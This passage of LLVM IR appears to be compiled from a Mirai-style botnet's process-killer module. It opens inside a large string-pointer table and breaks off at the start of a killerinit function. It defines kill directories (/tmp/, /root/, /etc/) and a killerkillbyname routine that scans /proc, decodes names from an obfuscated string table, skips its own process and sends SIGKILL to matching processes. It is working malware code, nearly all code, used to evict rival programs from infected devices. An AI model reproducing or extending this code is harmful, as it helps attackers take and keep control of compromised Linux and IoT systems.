i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.261, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.262, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.263, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.264, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.265, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.267, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.268, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.269, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.270, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.272, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.273, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.274, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.275, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.276, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.277, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.278, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.279, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.280, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.281, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.282, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.283, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.284, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.285, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.286, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.287, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.288, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.289, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.290, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.291, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.292, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.293, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.294, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.295, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.296, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.297, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.298, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.299, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.300, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.301, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.302, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.303, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.306, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.307, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.308, i32 0, i32 0)], align 16
@.str.309 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.310 = private unnamed_addr constant [7 x i8] c"/root/\00", align 1
@.str.311 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@killdirectories = dso_local global [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.309, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.310, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.311, i32 0, i32 0)], align 16
@pidPath = dso_local global [100 x i8] zeroinitializer, align 16
@.str.312 = private unnamed_addr constant [7 x i8] c"/proc/\00", align 1
@.str.313 = private unnamed_addr constant [5 x i8] c"self\00", align 1
@killerpid = dso_local global i32 0, align 4
@i = dso_local global i32 0, align 4
@.str.314 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDR = dso_local global i32 0, align 4
@fd = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @openandclose(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %4 = load i8*, i8** %2, align 8
  %5 = call i32 (i8*, i32, ...) @open(i8* %4, i32 0)
  store i32 %5, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i64 @read(i32 %6, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @pidPath, i64 0, i64 0), i64 100)
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  ret void
}

declare i32 @open(i8*, i32, ...) #1

declare i64 @read(i32, i8*, i64) #1

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killerkillbyname(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.dirent*, align 8
  %4 = alloca %struct.__dirstream*, align 8
  %5 = alloca [64 x i8], align 16
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %8 = call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.312, i64 0, i64 0))
  store %struct.__dirstream* %8, %struct.__dirstream** %4, align 8
  br label %9

9:                                                ; preds = %58, %50, %45, %1
  %10 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %11 = call %struct.dirent* @readdir(%struct.__dirstream* %10)
  store %struct.dirent* %11, %struct.dirent** %3, align 8
  %12 = icmp ne %struct.dirent* %11, null
  br i1 %12, label %13, label %59

13:                                               ; preds = %9
  %14 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  store i8* %14, i8** %6, align 8
  %15 = load %struct.dirent*, %struct.dirent** %3, align 8
  %16 = getelementptr inbounds %struct.dirent, %struct.dirent* %15, i32 0, i32 4
  %17 = getelementptr inbounds [256 x i8], [256 x i8]* %16, i64 0, i64 0
  %18 = call i32 @atoi(i8* %17) #6
  store i32 %18, i32* %7, align 4
  call void @table_unlock_val(i8 zeroext 15)
  call void @table_unlock_val(i8 zeroext 18)
  %19 = load i8*, i8** %6, align 8
  %20 = call i8* @table_retrieve_val(i32 15, i32* null)
  %21 = call i32 @util_strcpy(i8* %19, i8* %20)
  %22 = load i8*, i8** %6, align 8
  %23 = sext i32 %21 to i64
  %24 = getelementptr inbounds i8, i8* %22, i64 %23
  store i8* %24, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = load %struct.dirent*, %struct.dirent** %3, align 8
  %27 = getelementptr inbounds %struct.dirent, %struct.dirent* %26, i32 0, i32 4
  %28 = getelementptr inbounds [256 x i8], [256 x i8]* %27, i64 0, i64 0
  %29 = call i32 @util_strcpy(i8* %25, i8* %28)
  %30 = load i8*, i8** %6, align 8
  %31 = sext i32 %29 to i64
  %32 = getelementptr inbounds i8, i8* %30, i64 %31
  store i8* %32, i8** %6, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = call i8* @table_retrieve_val(i32 18, i32* null)
  %35 = call i32 @util_strcpy(i8* %33, i8* %34)
  %36 = load i8*, i8** %6, align 8
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds i8, i8* %36, i64 %37
  store i8* %38, i8** %6, align 8
  call void @table_lock_val(i8 zeroext 15)
  call void @table_lock_val(i8 zeroext 18)
  %39 = load %struct.dirent*, %struct.dirent** %3, align 8
  %40 = getelementptr inbounds %struct.dirent, %struct.dirent* %39, i32 0, i32 4
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %40, i64 0, i64 0
  call void @openandclose(i8* %41)
  %42 = getelementptr inbounds [64 x i8], [64 x i8]* %5, i64 0, i64 0
  %43 = call i8* @strstr(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i64 0, i64 0)) #6
  %44 = icmp ne i8* %43, null
  br i1 %44, label %45, label %46

45:                                               ; preds = %13
  br label %9, !llvm.loop !6

46:                                               ; preds = %13
  %47 = load i32, i32* %7, align 4
  %48 = load i32, i32* @killerpid, align 4
  %49 = icmp eq i32 %47, %48
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  br label %9, !llvm.loop !6

51:                                               ; preds = %46
  %52 = load i8*, i8** %2, align 8
  %53 = call i8* @strcasestr(i8* getelementptr inbounds ([100 x i8], [100 x i8]* @pidPath, i64 0, i64 0), i8* %52) #6
  %54 = icmp ne i8* %53, null
  br i1 %54, label %55, label %58

55:                                               ; preds = %51
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @kill(i32 %56, i32 9) #7
  br label %58

58:                                               ; preds = %55, %51
  call void @llvm.memset.p0i8.i64(i8* align 16 getelementptr inbounds ([100 x i8], [100 x i8]* @pidPath, i64 0, i64 0), i8 0, i64 100, i1 false)
  br label %9, !llvm.loop !6

59:                                               ; preds = %9
  %60 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %61 = call i32 @closedir(%struct.__dirstream* %60)
  ret void
}

declare %struct.__dirstream* @opendir(i8*) #1

declare %struct.dirent* @readdir(%struct.__dirstream*) #1

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

declare void @table_unlock_val(i8 zeroext) #1

declare i32 @util_strcpy(i8*, i8*) #1

declare i8* @table_retrieve_val(i32, i32*) #1

declare void @table_lock_val(i8 zeroext) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i8* @strcasestr(i8*, i8*) #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

declare i32 @closedir(%struct.__dirstream*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @killerinit() #0 {
  %1 = call i32 @getpid() #7
  store i32 %1, i32* @killerpid, align 4
